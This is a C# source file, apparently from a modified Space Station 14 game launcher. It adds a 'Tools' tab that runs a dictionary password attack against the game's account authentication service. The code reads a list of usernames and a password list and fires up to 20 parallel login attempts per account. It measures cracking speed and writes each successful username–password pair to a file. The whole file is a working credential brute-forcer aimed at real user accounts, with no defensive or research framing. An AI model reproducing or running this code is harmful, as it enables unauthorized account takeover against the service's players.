using System;
using System.IO;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Globalization;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Input;
using Avalonia.Controls;
using Avalonia.Data.Converters;
using Avalonia.Input;
using Avalonia.Media;
using DynamicData;
using Marsey;
using Marsey.Config;
using Marsey.Game.Patches;
using Marsey.Misc;
using Marsey.Stealthsey;
using Microsoft.Toolkit.Mvvm.Input;
using Serilog;
using Splat;
using SS14.Launcher.Api;
using SS14.Launcher.Marseyverse;
using SS14.Launcher.Models.ContentManagement;
using SS14.Launcher.Models.Data;
using SS14.Launcher.Models.EngineManager;
using SS14.Launcher.Models.Logins;
using SS14.Launcher.Utility;
using SS14.Launcher.ViewModels.Login;
using TerraFX.Interop.WinRT;
using static SS14.Launcher.ViewModels.Login.LoginViewModel;
using ReactiveUI;
using System.Threading;

namespace SS14.Launcher.ViewModels.MainWindowTabs;

public class ToolsTabViewModel : MainWindowTabViewModel
{
    private readonly AuthApi _authApi;
    private double _passwordsPerMinute;
    public double PasswordsPerMinute
    {
        get => _passwordsPerMinute;
        set => this.RaiseAndSetIfChanged(ref _passwordsPerMinute, value);
    }

    private string _foundPassword = "";

    private string outputPath = "";

    public string FoundPassword
    {
        get => _foundPassword;
        set => this.RaiseAndSetIfChanged(ref _foundPassword, value);
    }

    private System.Timers.Timer? _ppsTimer;
    private readonly List<DateTime> _attemptTimestamps = new();
    private DateTime _bruteStartTime;

    private string _elapsedTime = "";
    public string ElapsedTime
    {
        get => _elapsedTime;
        set => this.RaiseAndSetIfChanged(ref _elapsedTime, value);
    }

    private int _dictLines;
    public int DictLines
    {
        get => _dictLines;
        set => this.RaiseAndSetIfChanged(ref _dictLines, value);
    }

    private bool _isRunning;
    public bool IsRunning
    {
        get => _isRunning;
        set => this.RaiseAndSetIfChanged(ref _isRunning, value);
    }

    public string StartStopButtonText => IsRunning ? "Stop" : "Start";

    private CancellationTokenSource? _cancelSource;
    public ICommand StartStopCommand => new RelayCommand(StartStop);

    private void StartStop()
    {
        if (IsRunning)
        {
            _cancelSource?.Cancel();
        }
        else
        {
            OnStartButtonPressed();
        }
    }

    public ToolsTabViewModel(AuthApi authApi)
    {
        _authApi = authApi ?? throw new ArgumentNullException(nameof(authApi));
        PasswordsPerMinute = 0.0;
    }

    public string cKeyPath { get; set; } = "";
    public string passwordsPath { get; set; } = "";

    public override string Name => "Tools";

    public async void OnStartButtonPressed()
    {
        try
        {
            var cKeys = File.ReadLines(CKeyPath);

            foreach (string cKey in cKeys)
            {
                IsRunning = true;
                this.RaisePropertyChanged(nameof(StartStopButtonText));
                FoundPassword = "";
                PasswordsPerMinute = 0.0;
                ElapsedTime = "";
                _attemptTimestamps.Clear();
                _bruteStartTime = DateTime.UtcNow;
                _cancelSource = new CancellationTokenSource();
                StreamReader sr = new StreamReader(passwordsPath);
                var passwords = new List<string>();
                string? dict;
                while ((dict = await sr.ReadLineAsync()) != null)
                    passwords.Add(dict);
                sr.Close();
                DictLines = passwords.Count;
                int count = 0;
                var startTime = _bruteStartTime;
                _ppsTimer?.Stop();
                _ppsTimer = new System.Timers.Timer(500);
                _ppsTimer.Elapsed += (s, e) =>
                {
                    var now = DateTime.UtcNow;
                    double elapsedSinceStart = (now - _bruteStartTime).TotalSeconds;
                    double window = Math.Min(10.0, elapsedSinceStart);
                    _attemptTimestamps.RemoveAll(ts => (now - ts).TotalSeconds > window);
                    var attempts = _attemptTimestamps.Count;
                    if (window > 0)
                    {
                        var ppm = (attempts / window) * 60.0;
                        PasswordsPerMinute = ppm;
                    }
                    else
                    {
                        PasswordsPerMinute = 0.0;
                    }
                    ElapsedTime = $"Время: {(now - _bruteStartTime).ToString(@"hh\:mm\:ss")}";
                };
                _ppsTimer.AutoReset = true;
                _ppsTimer.Start();

                int maxParallel = 20;
                var semaphore = new SemaphoreSlim(maxParallel);
                var tasks = new List<Task>();
                bool found = false;
                object foundLock = new object();
                var token = _cancelSource.Token;

                foreach (var pwd in passwords)
                {
                    await semaphore.WaitAsync(token);
                    if (found || token.IsCancellationRequested) { semaphore.Release(); break; }
                    var localPwd = pwd;
                    var task = Task.Run(async () =>
                    {
                        try
                        {
                            if (token.IsCancellationRequested) return;
                            var request = new AuthApi.AuthenticateRequest(cKey, localPwd);
                            var resp = await _authApi.AuthenticateAsync(request);
                            if (token.IsCancellationRequested) return;
                            lock (_attemptTimestamps)
                            {
                                _attemptTimestamps.Add(DateTime.UtcNow);
                            }
                            Interlocked.Increment(ref count);
                            if (resp.IsSuccess && !token.IsCancellationRequested)
                            {
                                lock (foundLock)
                                {
                                    if (!found)
                                    {
                                        found = true;
                                        FoundPassword = localPwd;

                                        using (StreamWriter writer = new StreamWriter(outputPath))
                                        {
                                            writer.WriteLine(cKey + " : " + localPwd);
                                            _cancelSource?.Cancel();
                                        }
                                    }
                                }
                            }
                        }
                        finally
                        {
                            semaphore.Release();
                        }
                    }, token);
                    tasks.Add(task);
                    if (found || token.IsCancellationRequested) break;
                }
                try
                {
                    await Task.WhenAll(tasks);
                }
                catch (OperationCanceledException) { }
                _ppsTimer.Stop();
                _attemptTimestamps.Clear();
                var totalElapsed = (DateTime.UtcNow - startTime).TotalSeconds;
                if (totalElapsed > 0)
                    PasswordsPerMinute = (count / totalElapsed) * 60.0;
                else
                    PasswordsPerMinute = 0.0;
                ElapsedTime = $"Время: {(DateTime.UtcNow - startTime).ToString(@"hh\:mm\:ss")}";
            }
        }
        catch (Exception e)
        {
            Log.Error(e, "Something went wrong");
        }
        finally
        {
            IsRunning = false;
            this.RaisePropertyChanged(nameof(StartStopButtonText));
            if (_ppsTimer != null)
            {
                _ppsTimer.Stop();
                _ppsTimer.Dispose();
                _ppsTimer = null;
            }
        }
    }
}
